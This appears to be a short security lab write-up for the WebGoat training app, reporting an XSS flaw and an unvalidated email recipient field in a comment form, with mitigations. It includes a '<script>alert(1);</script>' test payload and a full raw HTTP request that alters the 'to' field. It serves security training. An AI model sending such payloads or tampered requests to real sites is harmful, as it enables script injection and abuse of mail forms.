## Vulnerability:

There are two issues:
1) There is now input validation of data provided by the user via HTML form so malicious input can be provided. In consequence reflected XSS attack is possible.
2) Email receipt is controlled by the user and not validated on server-side so the malicious user can send email to arbitrary person using given HTML form.

## Exploitation:

In 'Questions or Comments:' from send malicious javaScript code, for testing purposes:
```
<script>alert(1);</script>
```

This will be executed by webgoat admin when reading email.

To send malicious javaScript payload additionally modify 'to' field in HTML form. I've used 'Live HTTP headers' firefox add-on for this purpose, sending following request:

```
Host: webgoat.hacking-lab.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://webgoat.hacking-lab.com/attack?Screen=47&menu=1700
Cookie: JSESSIONID=3B42A5BADB7D88877255309F1E2230D1
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 109

subject=Comment+for+WebGoat&to=ciec%40owasp.org&msg=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&SUBMIT=Send%21
```

## Mitigation:

1) Use input validation library or implement own solution for defense against XSS attacks (OWASP ESAPI can be used or OWASP XSS Prevention Cheat Sheet as guide for implementing own solution).
2) It should be possible to send email only to webgoat@owasp.org field to in HTML form is not needed or it should be validated on server-side) 
